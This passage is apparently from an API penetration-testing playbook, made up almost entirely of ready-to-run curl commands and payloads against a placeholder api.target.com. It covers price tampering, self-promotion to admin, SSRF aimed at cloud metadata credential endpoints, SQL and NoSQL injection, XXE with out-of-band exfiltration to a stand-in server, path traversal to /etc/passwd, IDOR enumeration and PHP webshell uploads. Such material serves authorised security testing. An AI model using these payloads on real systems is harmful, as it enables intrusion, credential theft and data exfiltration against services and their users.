curl -s -X POST "https://api.target.com/api/orders/101/items" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id":999,"quantity":1,"price":0}'

# Price override in cart
curl -s -X PUT "https://api.target.com/api/cart/item/1" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"price":0.01}'
```

### 16.5 Account Registration Abuse

```bash
# Mass registration
for i in $(seq 1 100); do
  curl -s -X POST "https://api.target.com/api/auth/register" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"user$i\",\"email\":\"user$i@test.com\",\"password\":\"Pass123!\"}" &
done
wait

# Registration with disposable email
curl -s -X POST "https://api.target.com/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"temp","email":"temp@guerrillamail.com","password":"Pass123!"}'

# Registration with plus addressing
curl -s -X POST "https://api.target.com/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test+admin@test.com","password":"Pass123!"}'
```

### 16.6 Privilege Escalation via Account Upgrade

```bash
# Self-role upgrade
curl -s -X PUT "https://api.target.com/api/users/me/role" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":"admin"}'

# Upgrade via PATCH
curl -s -X PATCH "https://api.target.com/api/users/me" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role_id":1}'

# Using special endpoints
curl -s -X POST "https://api.target.com/api/users/upgrade" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"plan":"enterprise"}'
```

---

## 17. Server-Side Request Forgery

### 17.1 SSRF via URL Parameters

```bash
# URL parameters that might fetch external resources
params=(
  "url"
  "url="
  "uri"
  "path"
  "dest"
  "redirect"
  "return"
  "return_to"
  "return_url"
  "callback"
  "callback_url"
  "next"
  "next_url"
  "target"
  "target_url"
  "endpoint"
  "webhook"
  "webhook_url"
  "link"
  "src"
  "source"
  "image_url"
  "img"
  "avatar"
  "profile_image"
  "file"
  "file_url"
  "download_url"
  "attachment"
  "cover"
  "thumbnail"
  "preview"
  "href"
  "action"
  "redirect_to"
  "redirect_uri"
)

for param in "${params[@]}"; do
  echo "=== $param ==="
  curl -s "https://api.target.com/api/function?$param=http://127.0.0.1:8080" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nHTTP: %{http_code}\n"
done
```

### 17.2 SSRF Payload Targets

```bash
# Internal IP ranges
for ip in "127.0.0.1" "127.0.0.1:80" "127.0.0.1:443" "127.0.0.1:8080" \
          "127.0.0.1:3000" "127.0.0.1:5000" "127.0.0.1:9000" \
          "localhost" "localhost:80" "localhost:8080" \
          "0.0.0.0" "0.0.0.0:80" "0.0.0.0:8080" \
          "10.0.0.1" "10.0.0.1:80" \
          "172.16.0.1" "172.16.0.1:80" \
          "192.168.1.1" "192.168.1.1:80" \
          "169.254.169.254" "169.254.169.254:80"; do
  echo "=== $ip ==="
  curl -s "https://api.target.com/api/fetch?url=http://$ip" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nHTTP: %{http_code}\n"
done
```

### 17.3 SSRF Bypass Techniques

```bash
# DNS rebinding domain
curl -s "https://api.target.com/api/fetch?url=http://1e100.127.0.0.1.nip.io:8080"

# URL with @ sign
curl -s "https://api.target.com/api/fetch?url=http://evil.com@127.0.0.1:8080/admin"

# Decimal IP representation
curl -s "https://api.target.com/api/fetch?url=http://2130706433:8080"

# Hexadecimal IP
curl -s "https://api.target.com/api/fetch?url=http://0x7f000001:8080"

# Octal IP
curl -s "https://api.target.com/api/fetch?url=http://0177.0.0.1:8080"

# IPv6 loopback
curl -s "https://api.target.com/api/fetch?url=http://[::1]:8080"

# IPv6 alternative
curl -s "https://api.target.com/api/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]:8080"

# Shortened IPv6
curl -s "https://api.target.com/api/fetch?url=http://[0:0:0:0:0:ffff:7f00:1]:8080"

# DNS rebinding
curl -s "https://api.target.com/api/fetch?url=http://7f000001.7f000001.nip.io:8080"

# URL shortener redirect
curl -s "https://api.target.com/api/fetch?url=http://bit.ly/ssrf-target"
```

### 17.4 Cloud Metadata SSRF

```bash
# AWS metadata
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/latest/user-data/"
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"

# GCP metadata
curl -s "https://api.target.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s "https://api.target.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
curl -s "https://api.target.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id"

# Azure metadata
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s "https://api.target.com/api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Alibaba Cloud metadata
curl -s "https://api.target.com/api/fetch?url=http://100.100.100.200/latest/meta-data/"
```

### 17.5 SSRF via File Protocol

```bash
# File protocol access
curl -s "https://api.target.com/api/fetch?url=file:///etc/passwd"
curl -s "https://api.target.com/api/fetch?url=file:///c:/windows/win.ini"
curl -s "https://api.target.com/api/fetch?url=file:///proc/self/environ"
curl -s "https://api.target.com/api/fetch?url=file:///proc/self/cmdline"
curl -s "https://api.target.com/api/fetch?url=file:///proc/self/fd/0"
curl -s "https://api.target.com/api/fetch?url=file:///proc/net/fib_trie"

# Dict protocol
curl -s "https://api.target.com/api/fetch?url=dict://127.0.0.1:6379/info"

# Gopher protocol
curl -s "https://api.target.com/api/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a"

# FTP protocol
curl -s "https://api.target.com/api/fetch?url=ftp://127.0.0.1:21"

# SMB protocol
curl -s "https://api.target.com/api/fetch?url=smb://127.0.0.1/admin"

# LDAP protocol
curl -s "https://api.target.com/api/fetch?url=ldap://127.0.0.1:389"
```

---

## 18. SQL Injection via API

### 18.1 Parameter-Based SQLi

```bash
# Classic SQL injection in query params
curl -s "https://api.target.com/api/users?id=1' OR '1'='1"
curl -s "https://api.target.com/api/users?id=1\" OR \"1\"=\"1"
curl -s "https://api.target.com/api/users?id=1' OR 1=1--"
curl -s "https://api.target.com/api/users?id=1' UNION SELECT 1,2,3--"

# Time-based blind SQLi
curl -s "https://api.target.com/api/users?id=1' OR SLEEP(5)--"
curl -s "https://api.target.com/api/users?id=1' WAITFOR DELAY '0:0:5'--"

# Boolean-based blind
curl -s "https://api.target.com/api/users?id=1' AND 1=1--"
curl -s "https://api.target.com/api/users?id=1' AND 1=2--"
```

### 18.2 Body-Based SQLi

```bash
# SQLi in JSON body
curl -s -X POST "https://api.target.com/api/users/search" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test' OR '1'='1","email":"test@test.com"}'

curl -s -X POST "https://api.target.com/api/users/search" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":{"search":"' OR 1=1--"},"email":"test@test.com"}'

# SQL injection in nested objects
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","email":"test@test.com","role":"user' OR role='admin"}'
```

### 18.3 Header-Based SQLi

```bash
# SQL injection in headers
curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN' OR '1'='1"

curl -s "https://api.target.com/api/users" \
  -H "User-Agent: ' OR 1=1--"

curl -s "https://api.target.com/api/users" \
  -H "X-Forwarded-For: ' OR 1=1--"
```

### 18.4 Second-Order SQLi

```bash
# Step 1: Insert malicious payload
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"sqli_test","email":"sqli'||(SELECT @@version)||'@test.com"}'

# Step 2: Trigger retrieval of stored payload
curl -s "https://api.target.com/api/users/search?email=sqli" \
  -H "Authorization: Bearer $TOKEN"
```

---

## 19. NoSQL Injection

### 19.1 MongoDB Injection

```bash
# MongoDB $ne (not equal) injection
curl -s 'https://api.target.com/api/users/login' \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# MongoDB $gt (greater than)
curl -s 'https://api.target.com/api/users/login' \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# MongoDB $regex injection
curl -s 'https://api.target.com/api/users/search' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username":{"$regex":".*"}}'

# MongoDB $in injection
curl -s 'https://api.target.com/api/users' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"id":{"$in":["1","2","3","4","5"]}}'

# MongoDB $where injection
curl -s 'https://api.target.com/api/users' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"$where":"1==1"}'

# MongoDB boolean bypass
curl -s -X POST 'https://api.target.com/api/auth/login' \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
```

### 19.2 NoSQL Payload Delivery

```bash
# JSON body NoSQL injection
curl -s -X POST "https://api.target.com/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# URL-encoded NoSQL injection
curl -s "https://api.target.com/api/users?username[\$ne]=&password[\$ne]="

# Query string NoSQL injection
curl -s 'https://api.target.com/api/users?username[$ne]=test&password[$ne]=test'

# NoSQL time-based injection
curl -s -X POST 'https://api.target.com/api/auth/login' \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
```

### 19.3 NoSQL Error Detection

```bash
# Trigger errors to identify NoSQL backend
curl -s -X POST 'https://api.target.com/api/auth/login' \
  -H "Content-Type: application/json" \
  -d '{"username":1,"password":1}'

curl -s -X POST 'https://api.target.com/api/auth/login' \
  -H "Content-Type: application/json" \
  -d '{"username":{"$bad operation":1},"password":"test"}'

# Look for MongoDB error messages
response=$(curl -s -X POST 'https://api.target.com/api/auth/login' \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}')
echo "$response" | grep -iE "(Mongo|MongoDB|mongod|BSON|ObjectID|ISODate|MongoError)"
```

---

## 20. XML External Entities

### 20.1 XXE via XML Content-Type

```bash
# Basic XXE payload
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>'

# XXE with parameter entities
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<user>
  <name>test</name>
  <email>test@test.com</email>
</user>'

# XXE via SOAP
curl -s -X POST "https://api.target.com/api/soap" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope>
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>'
```

### 20.2 Blind XXE

```bash
# Blind XXE with out-of-band exfiltration
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER:PORT/xxe">
  %xxe;
]>
<user>
  <name>test</name>
  <email>test@test.com</email>
</user>'

# Blind XXE with parameter entity to exfiltrate data
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR_SERVER:PORT/evil.dtd">
  %dtd;
]>
<user>
  <name>test</name>
  <email>test@test.com</email>
</user>'

# DTD file content:
# <!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR_SERVER:PORT/?data=%file;'>">
# %all;
```

### 20.3 XXE via SVG Upload

```bash
# XXE through file upload (SVG)
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Content-Type: image/svg+xml" \
  -H "Authorization: Bearer $TOKEN" \
  --data-binary '<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>'
```

### 20.4 XXE via DOCX/DOC

```bash
# XXE through DOCX upload (requires crafting docx with malicious XML)
# Word/document.xml in a DOCX can contain XXE payloads
# Reference: https://github.com/brimstone/demonsaw
```

---

## 21. Path Traversal

### 21.1 Path Traversal in Parameters

```bash
# Basic path traversal
curl -s "https://api.target.com/api/files/download?path=../../../etc/passwd"
curl -s "https://api.target.com/api/files/download?path=..%2f..%2f..%2fetc%2fpasswd"
curl -s "https://api.target.com/api/files/download?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Windows path traversal
curl -s "https://api.target.com/api/files/download?path=..\\..\\..\\windows\\win.ini"
curl -s "https://api.target.com/api/files/download?path=..%5c..%5c..%5cwindows%5cwin.ini"

# Absolute path
curl -s "https://api.target.com/api/files/download?path=/etc/passwd"
curl -s "https://api.target.com/api/files/download?path=c:\\windows\\win.ini"
```

### 21.2 Path Traversal in POST Body

```bash
# JSON path traversal
curl -s -X POST "https://api.target.com/api/files/read" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"path":"../../../etc/passwd"}'

curl -s -X POST "https://api.target.com/api/files/read" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"filename":"../../../etc/passwd"}'

curl -s -X POST "https://api.target.com/api/files/read" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"file":"/etc/passwd"}'
```

### 21.3 Path Traversal Bypass Techniques

```bash
# Double encoding
curl -s "https://api.target.com/api/files/download?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# Triple encoding
curl -s "https://api.target.com/api/files/download?path=%25252e%25252e%25252fetc%25252fpasswd"

# Unicode encoding
curl -s "https://api.target.com/api/files/download?path=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
curl -s "https://api.target.com/api/files/download?path=%uff0e%uff0e%uff0fetc%uff0fpasswd"

# Backslash tricks
curl -s "https://api.target.com/api/files/download?path=../../../etc/./passwd"
curl -s "https://api.target.com/api/files/download?path=../../../etc/.../passwd"
curl -s "https://api.target.com/api/files/download?path=../../../etc/..../passwd"

# Null byte truncation
curl -s "https://api.target.com/api/files/download?path=../../../etc/passwd%00.jpg"
curl -s "https://api.target.com/api/files/download?path=../../../etc/passwd%00.png"

# Long path traversal
curl -s "https://api.target.com/api/files/download?path=../../../../../../../../../../../../etc/passwd"

# Filter bypass with nested traversal
curl -s "https://api.target.com/api/files/download?path=....//....//....//etc/passwd"
curl -s "https://api.target.com/api/files/download?path=..;/..;/..;/etc/passwd"
```

---

## 22. Insecure Direct Object References Advanced

### 22.1 Hash/ID Manipulation

```bash
# Sequential ID guessing
for id in $(seq 1 100); do
  curl -s "https://api.target.com/api/documents/$id" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nDocument $id: %{http_code}\n"
done

# GUID/UUID manipulation
for uuid in "00000000-0000-0000-0000-000000000000" \
            "00000000-0000-0000-0000-000000000001" \
            "00000000-0000-0000-0000-000000000010" \
            "00000000-0000-0000-0000-000000000100" \
            "00000000-0000-0000-0000-000000001000" \
            "ffffffff-ffff-ffff-ffff-ffffffffffff"; do
  curl -s "https://api.target.com/api/users/$uuid/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nUUID $uuid: %{http_code}\n"
done

# Base64-encoded IDs
curl -s "https://api.target.com/api/users/$(echo -n '1' | base64)" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/users/$(echo -n 'admin' | base64)" \
  -H "Authorization: Bearer $TOKEN"
```

### 22.2 IDOR in Filter/Search Parameters

```bash
# Search by user ID
curl -s "https://api.target.com/api/orders?search=user_id:1" \
  -H "Authorization: Bearer $TOKEN"

# Filter bypass
curl -s "https://api.target.com/api/orders?filter=all" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/orders?status=all" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/orders?scope=all" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/orders?include_deleted=true" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/orders?show_all=true" \
  -H "Authorization: Bearer $TOKEN"
```

### 22.3 IDOR via Batch Operations

```bash
# Batch fetch
curl -s -X POST "https://api.target.com/api/batch" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "requests": [
      {"method":"GET","path":"/api/users/1"},
      {"method":"GET","path":"/api/users/2"},
      {"method":"GET","path":"/api/users/3"},
      {"method":"GET","path":"/api/users/4"},
      {"method":"GET","path":"/api/users/5"},
      {"method":"GET","path":"/api/admin/config"}
    ]
  }'

# Bulk export
curl -s "https://api.target.com/api/export?type=csv&include=all" \
  -H "Authorization: Bearer $TOKEN"
```

### 22.4 Mass IDOR Enumeration Script

```bash
# Comprehensive IDOR enumeration
target="https://api.target.com/api"
token="$TOKEN"
resources=("users" "orders" "documents" "invoices" "payments" "profiles" "messages" "notifications" "tickets" "reports" "logs" "audit" "sessions" "api-keys" "credentials")

for resource in "${resources[@]}"; do
  echo "=== Testing /$resource ==="
  for id in 1 2 3 10 100 1000; do
    response=$(curl -s "$target/$resource/$id" \
      -H "Authorization: Bearer $token" \
      -w "\nHTTP: %{http_code}")
    echo "GET /$resource/$id: $response" | head -3
  done
done
```

---

## 23. API Key Leakage

### 23.1 Key in URL / Referrer

```bash
# API key in query string
curl -s "https://api.target.com/api/users?api_key=sk_test_123456789"
curl -s "https://api.target.com/api/users?key=AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz"
curl -s "https://api.target.com/api/users?token=ghp_1234567890abcdef"

# Check referrer header leaking keys
curl -s "https://api.target.com/api/users" \
  -H "Referer: https://internal.target.com/dashboard?api_key=sk_live_987654321"

# Check for key in response body
curl -s "https://api.target.com/api/users/1" \
  -H "Authorization: Bearer $TOKEN" | \
  grep -iE "(api[_-]?key|secret|token|password|sk_live|sk_test|pk_live|pk_test|AIza|ghp_|gho_|ghu_|ghs_|ghr_)"
```

### 23.2 Key Leakage in Error Messages

```bash
# Trigger errors that might leak keys
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"api_key":"INVALID_KEY","name":"test"}'

curl -s "https://api.target.com/api/users?source=stripe&key=sk_test_xxxx" \
  -H "Authorization: Bearer $TOKEN"
```

### 23.3 Common Key Names in Responses

```bash
# Check all response fields for sensitive key names
fields=("api_key" "apiKey" "api-key" "apikey" "secret" "secret_key" "secretKey" "token" "access_token" "refresh_token" "client_secret" "client_id" "app_secret" "app_id" "consumer_key" "consumer_secret" "auth_token" "session_token" "csrf_token" "stripe_key" "stripe_secret" "aws_key" "aws_secret" "gcp_key" "azure_key")

for field in "${fields[@]}"; do
  curl -s "https://api.target.com/api/users/1" \
    -H "Authorization: Bearer $TOKEN" | \
    jq ".$field" 2>/dev/null | grep -v null
done
```

---

## 24. WebSocket API Testing

### 24.1 WebSocket Connection Testing

```bash
# Using wscat (npm install -g wscat)
wscat -c wss://api.target.com/ws
wscat -c wss://api.target.com/ws -H "Authorization: Bearer $TOKEN"

# Test without auth
wscat -c wss://api.target.com/ws

# Test different protocols
wscat -c ws://api.target.com/ws
wscat -c wss://api.target.com/socket.io
wscat -c wss://api.target.com/ws/v1
```

### 24.2 WebSocket Message Manipulation

```bash
# After connecting, send manipulated messages
# {"event":"join","data":{"room":"admin"}}
# {"event":"message","data":{"text":"<script>alert(1)</script>"}}
# {"event":"auth","data":{"token":"invalid","role":"admin"}}
# {"event":"get","data":{"userId":1,"resource":"users"}}

# Using a WebSocket client script
python3 << 'EOF'
import asyncio
import websockets

async def test():
    async with websockets.connect(
        'wss://api.target.com/ws',
        extra_headers={'Authorization': 'Bearer TOKEN'}
    ) as ws:
        # Test messages
        messages = [
            '{"event":"join","data":{"room":"admin"}}',
            '{"event":"message","data":{"text":"<script>alert(1)</script>"}}',
            '{"event":"auth","data":{"role":"admin"}}',
            '{"event":"get","data":{"userId":1}}',
            '{"event":"getAll","data":{}}',
        ]
        for msg in messages:
            await ws.send(msg)
            response = await ws.recv()
            print(f"Sent: {msg}")
            print(f"Received: {response}")

asyncio.run(test())
EOF
```

### 24.3 WebSocket IDOR

```bash
# Subscribe to another user's events
# {"event":"subscribe","data":{"userId":5,"channel":"notifications"}}
# {"event":"watch","data":{"orderId":101}}
# {"event":"monitor","data":{"sessionId":"abc123"}}
```

### 24.4 WebSocket Injection

```bash
# SQL injection via WebSocket
# {"event":"search","data":{"query":"' OR 1=1--"}}

# NoSQL injection
# {"event":"search","data":{"query":{"$ne":""}}}

# Command injection
# {"event":"exec","data":{"cmd":"id"}}
```

---

## 25. File Upload via API

### 25.1 Direct File Upload Testing

```bash
# Upload file via multipart form
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@webshell.php"
  -F "description=test"

# Upload with filename manipulation
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@image.png;filename=webshell.php"

# JSON base64 upload (may be decoded server-side)
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "filename": "test.php",
    "content": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    "content_type": "image/png"
  }'
```

### 25.2 File Upload Bypass Techniques

```bash
# Extension bypass variations
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php.jpg"

curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php5"

curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.phtml"

curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php%00.jpg"

curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php."
```

### 25.3 SVG Upload for XSS

```bash
# SVG with embedded XSS
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@-;filename=test.svg" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert(document.cookie)</script>
  <text x="10" y="20">XSS</text>
</svg>
EOF
```

### 25.4 File Upload Path Traversal

```bash
# Path traversal in filename
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.txt;filename=../../../var/www/html/shell.php"

# Zip slip (malicious zip with path traversal)
# Create a zip with files like ../../../etc/cron.d/malicious
```

### 25.5 File Upload Content-Type Bypass

```bash
# Change Content-Type header
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: image/jpeg" \
  --data-binary @webshell.php

# Magic bytes bypass
curl -s -X POST "https://api.target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  --data-binary $'\x89PNG\r\n\x1a\n'$(cat webshell.php) \
  -H "Content-Type: image/png"
```

---

## End of API Testing Rules

### Checklist Summary

```
[ ] Authentication tested on every endpoint
[ ] IDOR tested on all CRUD operations
[ ] Rate limit bypass attempted
[ ] CORS configuration verified
[ ] GraphQL introspection checked
[ ] Mass assignment tested
[ ] HTTP method override tested
[ ] Content-type switching tested
[ ] Version diffing v1 vs v2
[ ] Parameter fuzzing completed
[ ] Error analysis complete
[ ] JWT token manipulation tested
[ ] SSRF on URL parameters
[ ] SQL injection on all inputs
[ ] NoSQL injection on JSON endpoints
[ ] XXE on XML content types
[ ] Path traversal on file endpoints
[ ] File upload bypass tested
[ ] WebSocket security verified
[ ] API documentation discovered
```

---

### curl Reference Quick Guide

```
# GET with auth
curl -s "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# POST JSON
curl -s -X POST "https://api.target.com/api/resource" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"key":"value"}'

# PUT JSON
curl -s -X PUT "https://api.target.com/api/resource/1" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"key":"new_value"}'

# PATCH JSON
curl -s -X PATCH "https://api.target.com/api/resource/1" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"key":"partial_update"}'

# DELETE
curl -s -X DELETE "https://api.target.com/api/resource/1" -H "Authorization: Bearer $TOKEN"

# OPTIONS (CORS preflight)
curl -s -X OPTIONS "https://api.target.com/api/resource" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: DELETE"

# HEAD (headers only)
curl -s -I "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# Show response headers
curl -s -D - "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# Only HTTP status code
curl -s -o /dev/null -w "%{http_code}" "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# Follow redirects
curl -s -L "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# Timeout after N seconds
curl -s --connect-timeout 5 --max-time 10 "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# Use proxy
curl -s -x http://127.0.0.1:8080 "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# Ignore SSL errors
curl -s -k "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# Custom User-Agent
curl -s "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN" -H "User-Agent: Mozilla/5.0"
```
